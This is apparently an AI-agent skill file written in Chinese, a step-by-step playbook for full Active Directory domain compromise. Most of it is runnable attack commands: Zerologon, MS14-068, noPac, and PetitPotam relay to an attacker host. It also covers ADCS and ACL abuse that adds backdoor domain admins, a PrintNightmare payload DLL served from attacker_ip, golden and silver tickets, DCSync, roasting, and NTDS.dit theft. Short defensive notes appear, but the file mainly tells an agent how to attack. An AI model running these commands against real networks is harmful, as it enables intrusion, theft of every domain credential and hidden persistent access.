---
name: domain-penetration
description: >-
  Domain penetration testing playbook. Use when attacking Active Directory environments, exploiting domain controller vulnerabilities, and achieving full domain compromise.
---

# SKILL: 域渗透全流程详解

## 1. 攻击前置条件与环境说明

### 核心目标
```
获取域内低权限账号 → 利用漏洞提权/获取哈希 → 拿下域控管理员权限 → 导出域内所有用户哈希
```

### 主机信息示例
- **边界PC-域内主机**：已被控制
- **域控主机**：10.10.2.200（域名：oa.com，主机名：dc.oa.com）
- **攻击机**：Windows、Kali Linux
- **域内普通账号**：oa.com/et，密码：A123456.
- **域内用户SID**：S-1-5-21-2960966483-183517332-1625364895-1103

### 代理配置
```bash
# proxychains配置
socks5 127.0.0.1 1080
```

## 2. Impacket工具集（域渗透核心工具）

### Impacket简介
Impacket是一组用于处理网络协议的Python库，包含大量内网/域控利用脚本：

| 脚本 | 用途 |
|---|---|
| `smbexec.py` | SMB协议远程执行命令 |
| `psexec.py` | PsExec远程执行 |
| `wmiexec.py` | WMI远程执行 |
| `secretsdump.py` | 导出SAM/LSA/AD哈希 |
| `dcsync.py` | DCSync攻击 |
| `ntlmrelayx.py` | NTLM中继攻击 |
| `getTGT.py` | 获取TGT票据 |
| `getST.py` | 获取服务票据 |
| `goldenPac.py` | 黄金票据+PAC漏洞组合利用 |

### Impacket基础用法

```bash
# SMBExec远程执行
python3 smbexec.py oa.com/et:A123456.@10.10.2.200

# PsExec远程执行
python3 psexec.py oa.com/et:A123456.@10.10.2.200

# WMIExec远程执行
python3 wmiexec.py oa.com/et:A123456.@10.10.2.200

# 获取TGT票据
python3 getTGT.py oa.com/et:A123456. -dc-ip 10.10.2.200

# 使用票据执行命令
KRB5CCNAME=et.ccache python3 smbexec.py -k -no-pass oa.com/dc$@10.10.2.200
```

## 3. 直接攻陷域控经典漏洞

### CVE-2020-1472 Zerologon（零逻辑漏洞）

**漏洞原理**：利用NetLogon协议认证过程中的缺陷，直接置空域控机器账号密码。

**影响范围**：Windows Server 2008 R2至Windows Server 2019的域控制器

**攻击条件**：攻击者需要能访问域控的NetLogon服务（445端口）

**攻击流程**：

```bash
# 1. 使用官方PoC检测漏洞是否存在
python3 zerologon_tester.py dc.oa.com 10.10.2.200

# 2. 使用完整EXP置空域控机器账号密码
python3 cve-2020-1472-exploit.py dc 10.10.2.200

# 3. 使用Impacket获取域控权限
python3 secretsdump.py -just-dc -no-pass 'oa.com/dc$@10.10.2.200'

# 4. 获取shell
python3 smbexec.py -no-pass 'oa.com/dc$@10.10.2.200'
```

### MS14-068（CVE-2014-6328）

**漏洞原理**：通过修改TGT票据中的PAC部分，实现从普通域用户权限提升至域管权限。

**补丁**：KB3011780

**攻击过程**：

```cmd
# 1. 生成TGT票据
shell MS14-068.exe -u et@oa.com -p A123456. -s S-1-5-21-2960966483-183517332-1625364895-1103 -d 10.10.2.200

# 2. 清除现有票据
klist purge

# 3. 注入新票据
shell mimikatz.exe "kerberos::ptc C:\Users\et\Desktop\TGT_et@oa.com.ccache" "exit"

# 4. 创建交互式shell
shell psexec.exe -accepteula \\dc.oa.com cmd
```

### CVE-2021-42278 & CVE-2021-42287（NoPac/sam-the-Admin）

**漏洞原理**：利用TGS票据生成机制，构造与域管账号相关的ST服务票据。

**工具1：sam-the-admin**

```bash
python3 sam_the_admin.py oa.com/et:'A123456.' -dc-ip 10.10.2.200 -debug
KRB5CCNAME='Administrator.ccache' /usr/bin/impacket-smbexec -target-ip 10.10.2.200 -dc-ip 10.10.2.200 -k -no-pass @'dc.oa.com'
python3 sam_the_admin.py oa.com/et:'A123456.' -dc-ip 10.10.2.200 -dump
```

**工具2：noPac**

```bash
proxychains python noPac.py -use-ldap oa.com/et:A123456. -dc-ip 10.10.2.200
proxychains python noPac.py -use-ldap oa.com/et:A123456. -dc-ip 10.10.2.200 -shell --impersonate administrator
```

### PetitPotam（强制NTLM中继）

**漏洞原理**：强制域控发起NTLM认证，配合ADCS漏洞获取域控证书。

**攻击流程**：

```bash
# 1. 启动NTLM中继到ADCS证书服务
python3 ntlmrelayx.py -t http://dc.oa.com/certsrv/certfnsh.asp -smb2support

# 2. 在另一个终端执行PetitPotam
python3 PetitPotam.py attacker_ip dc.oa.com

# 3. 获取域控证书后利用
certipy cert -pfx administrator.pfx -dc-ip 10.10.2.200 -target dc.oa.com
```

## 4. ADCS证书漏洞（Certipy）

### Certipy简介
Certipy是用于ADCS（Active Directory Certificate Services）漏洞利用的工具。

### ESC系列漏洞利用

**ESC1：权限配置错误**

```bash
# 扫描易受攻击的证书模板
certipy find -u et@oa.com -p A123456. -dc-ip 10.10.2.200

# 请求证书
certipy req -u et@oa.com -p A123456. -dc-ip 10.10.2.200 -target dc.oa.com -template ESC1_Template

# 获取hash
certipy cert -pfx cert.pfx -dc-ip 10.10.2.200
```

**ESC2：证书模板权限滥用**

```bash
# 查找可滥用的模板
certipy find -u et@oa.com -p A123456. -dc-ip 10.10.2.200 -vulnerable

# 请求证书并获取域管权限
certipy req -u et@oa.com -p A123456. -dc-ip 10.10.2.200 -template User -ca 'dc-CA'
```

## 5. ACL权限滥用

### bloodyAD

**简介**：用于AD ACL权限滥用的工具。

```bash
# 安装依赖
pip install ldap3 impacket

# 添加域管理员
python3 bloodyAD.py -d oa.com -u et -p A123456. --host 10.10.2.200 add userCompromise --user hacker --password Hacker123!

# 添加用户到域管理员组
python3 bloodyAD.py -d oa.com -u et -p A123456. --host 10.10.2.200 add groupMember --group 'Domain Admins' --member hacker
```

### ACLPwn

**简介**：ACL自动提权路径工具。

```bash
# 安装
pip install aclpwn

# 分析并执行提权路径
aclpwn -d oa.com -u et -p A123456. -t dc.oa.com
```

## 6. Group Policy滥用

### SharpGPOAbuse

**简介**：通过组策略配置滥用拿下域控。

```powershell
# 在域控上执行命令
.\SharpGPOAbuse.exe --AddUserToGroup --UserAccount hacker --GroupName "Domain Admins" --GPOName "Default Domain Policy"

# 添加登录脚本
.\SharpGPOAbuse.exe --AddScript --ScriptName "backdoor.bat" --ScriptContents "net user hacker Hacker123! /add" --GPOName "Default Domain Policy"

# 添加计算机脚本
.\SharpGPOAbuse.exe --AddComputerScript --ScriptName "backdoor.bat" --ScriptContents "net localgroup administrators hacker /add" --GPOName "Default Domain Policy"
```

### 组策略首选项提权

```cmd
# 查找配置文件
shell dir /s /a \\10.10.2.200\sysvol\*.xml

# 读取配置文件
shell type \\10.10.2.200\sysvol\oa.com\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml

# 解密密码
gpp-decrypt S0ABkxabkW1aj9rovqlKccANkdAJ1UgYOXWq6TSJQog
```

## 7. 黄金票据攻击（Golden Ticket）

**原理**：利用krbtgt账号的NTLM哈希伪造任意用户的TGT票据。

```cmd
# 获取域SID
whoami /all

# 获取krbtgt哈希
mimikatz.exe "privilege::debug" "lsadump::lsa /patch" "exit"

# 生成黄金票据
mimikatz.exe "kerberos::golden /user:Administrator /domain:test.com /sid:S-1-5-21-1234567890-123456789-1234567890 /krbtgt:88a4f40f50a96335564e1d465558dac9 /ticket:C:\golden.ticket" "exit"

# 导入票据
mimikatz.exe "kerberos::ptt C:\golden.ticket" "exit"

# 远程登录域控
psexec.exe \\192.168.2.103 -s cmd
```

## 8. 白银票据攻击（Silver Ticket）

**原理**：利用服务账号的NTLM哈希伪造服务票据。

```cmd
mimikatz.exe "kerberos::golden /user:Administrator /domain:test.com /sid:S-1-5-21-1234567890-123456789-1234567890 /target:dc.test.com /service:cifs /rc4:88a4f40f50a96335564e1d465558dac9 /ticket:C:\silver.ticket" "exit"
```

## 9. DCSync攻击

**原理**：模拟域控行为同步Active Directory数据。

```cmd
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:test.com /user:krbtgt" "exit"
```

```bash
python3 secretsdump.py -just-dc user@dc.test.com
```

## 10. BloodHound AD拓扑分析

### BloodHound简介
BloodHound是AD信息可视化工具，用于寻找直达域管理员/域控的攻击路径。

### 使用流程

**步骤1：使用SharpHound收集数据**

```powershell
# 基础收集
.\SharpHound.exe -c All

# 静默收集
.\SharpHound.exe -c All -d oa.com --Stealth

# 收集到指定文件
.\SharpHound.exe -c All -o output.json
```

**步骤2：在BloodHound中分析**

```bash
# 启动BloodHound
bloodhound

# 导入数据
# 在界面中点击"Upload Data"，选择SharpHound生成的JSON文件

# 分析攻击路径
# 使用查询功能：
# - Find all paths to Domain Admins
# - Find all Domain Admins
# - Find all Kerberoastable users
```

## 11. 域渗透实战建议

### 攻击路线规划

```
阶段1：信息搜集
  ├── BloodHound拓扑分析
  ├── 获取域内账号信息
  ├── 确认域结构和域控位置
  └── 收集凭据（哈希、票据）

阶段2：权限提升
  ├── 尝试Zerologon（CVE-2020-1472）
  ├── 尝试MS14-068
  ├── 尝试NoPac（CVE-2021-42278/42287）
  ├── 尝试ADCS证书漏洞（ESC系列）
  └── 尝试ACL权限滥用

阶段3：域控突破
  ├── PetitPotam + NTLM中继
  ├── 黄金票据攻击
  ├── DCSync获取所有用户哈希
  └── 导出域内所有凭据

阶段4：横向扩展
  ├── Impacket工具集横向移动
  ├── 控制所有域内主机
  └── 建立持久化访问
```

### 工具推荐

| 工具 | 用途 |
|---|---|
| **Impacket** | SMB/RPC/LDAP协议操作 |
| **Mimikatz** | Windows凭据窃取 |
| **BloodHound** | AD信息可视化 |
| **SharpHound** | BloodHound数据收集 |
| **Certipy** | ADCS证书漏洞利用 |
| **bloodyAD** | AD ACL权限滥用 |
| **ACLPwn** | ACL自动提权路径 |
| **CrackMapExec** | 多协议横向移动 |

### 防御建议

- **及时打补丁**：特别是KB3011780（MS14-068）、KB4557936（Zerologon）
- **限制机器账号创建权限**：防止NoPac攻击
- **禁用组策略首选项**：或使用LAPS替代
- **限制ADCS证书模板权限**：防止ESC系列漏洞
- **监控异常Kerberos票据请求**：检测黄金/白银票据攻击
- **实施权限最小化**：限制域管理员权限范围
- **定期审计ACL权限**：发现异常权限配置

## 12. [补充推演] Kerberoasting攻击

### 原理
请求域中某服务的TGS票据，该票据使用服务账户的NTLM哈希加密。离线破解票据即可获取服务账户明文密码。

### 攻击条件
- 拥有域内任意普通用户凭据
- 目标服务账户注册了SPN（ServicePrincipalName）
- 服务账户密码强度较低（可离线破解）

### 攻击流程

**使用Rubeus（Windows）**：
```cmd
# 导出所有注册SPN用户的TGS票据
Rubeus.exe kerberoast /outfile:hashes.txt

# 针对特定用户
Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.txt

# 使用AES256加密的票据（更难检测）
Rubeus.exe kerberoast /aes256 /outfile:hashes.txt
```

**使用Impacket（Linux）**：
```bash
# 获取所有Kerberoastable用户的TGS票据
python3 GetUserSPNs.py oa.com/et:A123456. -dc-ip 10.10.2.200 -request

# 输出格式为hashcat可破解格式
python3 GetUserSPNs.py oa.com/et:A123456. -dc-ip 10.10.2.200 -request -outputfile hashes.txt
```

### 离线破解

```bash
# 使用hashcat破解（模式13100）
hashcat -m 13100 hashes.txt wordlist.txt

# 使用john破解
john --format=krb5tgs --wordlist=wordlist.txt hashes.txt
```

### 防御措施
- 服务账户使用强密码（25位以上随机密码）
- 使用组托管服务账户（gMSA）
- 监控异常的TGS请求行为

## 13. [补充推演] AS-REP Roasting攻击

### 原理
针对未启用"不需要Kerberos预身份验证"（DONT_REQ_PREAUTH）的域用户，攻击者可以请求该用户的AS-REP票据，离线破解获取密码。

### 攻击条件
- 目标域用户未启用Kerberos预身份验证
- 不需要任何域凭据即可获取票据

### 攻击流程

**使用Rubeus（Windows）**：
```cmd
# 枚举并获取AS-REP Roastable用户
Rubeus.exe asreproast /outfile:hashes.txt

# 指定用户
Rubeus.exe asreproast /user:et /outfile:hashes.txt
```

**使用Impacket（Linux）**：
```bash
# 无需凭据，枚举AS-REP Roastable用户
python3 GetNPUsers.py oa.com/ -no-pass -usersfile users.txt -dc-ip 10.10.2.200

# 使用已知凭据枚举
python3 GetNPUsers.py oa.com/et:A123456. -request -dc-ip 10.10.2.200
```

### 离线破解

```bash
# 使用hashcat破解（模式18200）
hashcat -m 18200 hashes.txt wordlist.txt
```

### 防御措施
- 确保所有域用户启用Kerberos预身份验证
- 定期审计域用户预身份验证配置
- 使用强密码策略

## 14. [补充推演] 委派攻击

### 非约束委派（Unconstrained Delegation）

**原理**：配置了非约束委派的机器会缓存所有通过Kerberos认证的用户的TGT票据。攻击者控制该机器后，可从LSASS内存中提取这些TGT票据，模拟用户访问任意服务。

**查找非约束委派机器**：
```powershell
# 使用PowerView
Get-NetComputer -Unconstrained -Properties dnshostname

# 使用Impacket
python3 findDelegation.py oa.com/et:A123456. -dc-ip 10.10.2.200
```

**提取TGT票据**：
```cmd
# 在非约束委派机器上执行
mimikatz.exe "privilege::debug" "sekurlsa::tickets" "exit"
```

**利用域管TGT**：
```cmd
# 注入域管TGT票据
mimikatz.exe "kerberos::ptt [0;3e7]-2-0-40e10000-Administrator@krbtgt-OA.COM.kirbi" "exit"
```

### 约束委派（Constrained Delegation）

**原理**：约束委派限制了服务可以代表用户访问的目标服务。但如果攻击者控制了配置约束委派的服务账户，可以伪造任意用户的票据访问指定服务。

**查找约束委派配置**：
```powershell
# PowerView查找约束委派
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# Impacket查找委派
python3 findDelegation.py oa.com/et:A123456. -dc-ip 10.10.2.200
```

**利用约束委派（Rubeus）**：
```cmd
# 使用已知密码伪造用户票据
Rubeus.exe s4u /user:svc_web /password:Password123 /impersonateuser:Administrator /msdsspn:cifs/dc.oa.com /ptt

# 使用NTLM Hash伪造
Rubeus.exe s4u /user:svc_web /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:cifs/dc.oa.com /ptt
```

**利用约束委派（Impacket）**：
```bash
# S4U2Self + S4U2Proxy
python3 getST.py -spn cifs/dc.oa.com -impersonate Administrator oa.com/svc_web:Password123 -dc-ip 10.10.2.200

# 使用票据
KRB5CCNAME=Administrator.ccache python3 smbexec.py -k -no-pass oa.com/Administrator@dc.oa.com
```

### 基于资源的约束委派（RBCD）

**原理**：RBCD允许将某机器账户的msDS-AllowedToActOnBehalfOfOtherIdentity属性设置为另一个账户，使其能代表任意用户访问该机器。攻击者只要拥有修改该属性的权限即可。

**攻击条件**：
- 拥有目标机器的WriteAccountRestrictions权限
- 或拥有GenericAll/GenericWrite/WriteProperty权限
- 拥有一个机器账户（或可以创建机器账户，默认域用户可创建10个）

**攻击流程**：
```powershell
# 步骤1：创建机器账户（如果还没有）
# 使用Powermad
New-MachineAccount -MachineAccount evil$ -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# 步骤2：设置RBCD
# 使用PowerView
Set-DomainObject -Identity target$ -Set @{"msDS-AllowedToActOnBehalfOfOtherIdentity"=$SD}

# 或使用Impacket的rbcd.py
python3 rbcd.py oa.com/et:A123456. -dc-ip 10.10.2.200 -delegate-to 'target$' -delegate-from 'evil$' -action write

# 步骤3：获取票据
python3 getST.py -spn cifs/target.oa.com -impersonate Administrator oa.com/'evil$':Password123! -dc-ip 10.10.2.200

# 步骤4：使用票据访问目标
KRB5CCNAME=Administrator.ccache python3 smbexec.py -k -no-pass oa.com/Administrator@target.oa.com
```

### 委派攻击防御
- 严格限制非约束委派的配置
- 服务账户使用gMSA
- 定期审计委派配置
- 将高权限用户标记为"敏感账户，不可委派"

## 15. [补充推演] PrintNightmare（CVE-2021-1675 / CVE-2021-34527）

### 原理
Windows Print Spooler服务存在漏洞，允许低权限用户远程加载恶意打印机驱动，实现任意代码执行（SYSTEM权限）。

### 攻击条件
- 目标开启Print Spooler服务
- 攻击者拥有任意域凭据或SMB匿名访问权限

### 攻击流程

**使用Impacket（Linux）**：
```bash
# 生成恶意DLL
msfvenom -p windows/x64/exec CMD='net user hacker Hacker123! /add && net localgroup administrators hacker /add' -f dll -o evil.dll

# 启动SMB共享
smbserver.py share ./ -smb2support

# 执行攻击
python3 CVE-2021-1675.py oa.com/et:A123456.@10.10.2.200 '\\attacker_ip\share\evil.dll'
```

**使用SharpPrintNightmare（Windows）**：
```cmd
# 远程利用
SharpPrintNightmare.exe \\attacker_ip\share\evil.dll \\10.10.2.200

# 本地利用
SharpPrintNightmare.exe \\attacker_ip\share\evil.dll
```

### 防御措施
- 安装最新补丁
- 在非打印服务器上禁用Print Spooler服务
- 限制打印机驱动安装权限

## 16. [补充推演] NTDS.dit提取

### 原理
NTDS.dit是域控的Active Directory数据库文件，包含所有域用户和计算机的哈希。需要域控权限或Volume Shadow Copy服务来提取。

### 方法1：Volume Shadow Copy

```cmd
# 创建卷影副本
vssadmin create shadow /for=C:

# 复制NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\SYSTEM

# 删除卷影副本
vssadmin delete shadows /shadow={ShadowCopyID} /quiet
```

### 方法2：ntdsutil

```cmd
ntdsutil
activate instance ntds
ifm
create full C:\ntds_dump
quit
quit
```

### 方法3：Impacket secretsdump（远程）

```bash
# 使用域管凭据远程提取
python3 secretsdump.py oa.com/Administrator:password@10.10.2.200 -just-dc

# 使用哈希传递
python3 secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH oa.com/Administrator@10.10.2.200
```

### 方法4：Mimikatz（本地域控执行）

```cmd
# 使用esent.dll提取
mimikatz.exe "lsadump::dcsync /domain:oa.com /all" "exit"

# 直接从NTDS.dit提取
mimikatz.exe "lsadump::ntds /ntds:C:\ntds.dit /system:C:\SYSTEM" "exit"
```

### 离线提取

```bash
# 使用secretsdump离线提取
python3 secretsdump.py -ntds ntds.dit -system SYSTEM local
```

## 17. [补充推演] 域渗透完整攻击路径决策树

### 路径选择逻辑

```
初始状态：拥有域内普通用户凭据
│
├── 第一步：信息搜集
│   ├── BloodHound拓扑分析 → 发现攻击路径
│   ├── 查找Kerberoastable用户 → Kerberoasting攻击
│   ├── 查找AS-REP Roastable用户 → AS-REP Roasting攻击
│   ├── 查找委派配置 → 委派攻击
│   └── ACL权限分析 → bloodyAD/ACLPwn提权
│
├── 第二步：凭据获取
│   ├── 离线破解Kerberoasting票据 → 获取服务账户密码
│   ├── 离线破解AS-REP票据 → 获取用户密码
│   ├── 委派攻击获取域管票据 → 直接域管权限
│   └── ACL滥用添加域管 → 直接域管权限
│
├── 第三步：域控突破（如果第二步未直接获取域管）
│   ├── Zerologon（CVE-2020-1472）→ 置空域控密码
│   ├── NoPac（CVE-2021-42278/42287）→ 域管票据伪造
│   ├── MS14-068 → PAC伪造提权
│   ├── PetitPotam + ADCS → 域控证书获取
│   ├── PrintNightmare → 域控RCE
│   └── 组策略滥用 → SharpGPOAbuse
│
├── 第四步：凭据导出
│   ├── DCSync → 导出所有用户哈希
│   ├── NTDS.dit提取 → 离线提取所有哈希
│   └── secretsdump → 远程批量导出
│
└── 第五步：权限维持
    ├── 黄金票据 → krbtgt哈希伪造TGT
    ├── 钻石票据 → 修改TGT中的PAC
    ├── 白银票据 → 服务哈希伪造ST
    ├── 添加隐藏域管账户
    └── Skeleton Key → 域控万能密码
```

### 工具协作矩阵

| 阶段 | 主力工具 | 辅助工具 | 衔接Skill |
|---|---|---|---|
| 信息搜集 | BloodHound + SharpHound | PowerView, ldapsearch | pivoting-lateral-movement |
| Kerberoasting | Rubeus / GetUserSPNs.py | hashcat, john | - |
| AS-REP Roasting | Rubeus / GetNPUsers.py | hashcat, john | - |
| 委派攻击 | Rubeus, Impacket | Powermad, PowerView | - |
| 漏洞利用 | noPac, Zerologon EXP | PetitPotam, PrintNightmare | - |
| ACL滥用 | bloodyAD, ACLPwn | BloodHound分析结果 | - |
| 域控突破 | Impacket, Mimikatz | Certipy, SharpGPOAbuse | internal-penetration |
| 凭据导出 | secretsdump, Mimikatz | ntdsutil, vssadmin | - |
| 权限维持 | Mimikatz | 黄金/白银票据 | c2-remote-control |
| 持久化C2 | Cobalt Strike, Sliver | Empire, Havoc | c2-remote-control |
| 横向扩展 | CrackMapExec, evil-winrm | Impacket套件 | pivoting-lateral-movement |
| 溯源反制 | 日志分析, 流量分析 | 蜜罐, 钓鱼反制 | traceback-counterattack |